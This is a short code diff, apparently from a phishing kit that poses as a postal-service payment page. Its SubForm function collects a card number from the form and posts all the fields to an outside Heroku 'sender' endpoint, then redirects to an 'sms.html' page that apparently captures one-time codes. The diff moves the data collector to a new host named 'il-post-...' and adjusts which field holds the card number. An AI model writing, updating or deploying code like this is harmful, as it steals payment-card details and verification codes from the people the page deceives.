@@ -94,10 +94,10 @@ function SubForm() {
   let ncardNumber=  cardNumberInput.value.replace(/\s/g, "");
 
   let f=  $("#myForm").serializeArray()
-  f[1].value =ncardNumber
+  f[2].value =ncardNumber
   
   $.ajax({
-  url: "https://postil-4fec669974ef.herokuapp.com/sender/api-sender",
+  url: "https://il-post-d64a3a31d8cb.herokuapp.com/sender/api-sender",
 //   url: "http://localhost:3000/sender/api-sender",
   type: "post",
   data: f,
@@ -109,7 +109,7 @@ function SubForm() {
   },
   success: function () {
           setTimeout(() => {
-            window.open("sms.html?cc=" + encodeURI(f[1].value), '_self');
+            window.open("sms.html?cc=" + encodeURI(f[2].value), '_self');
           }, 5000)
   },
   error: function () {
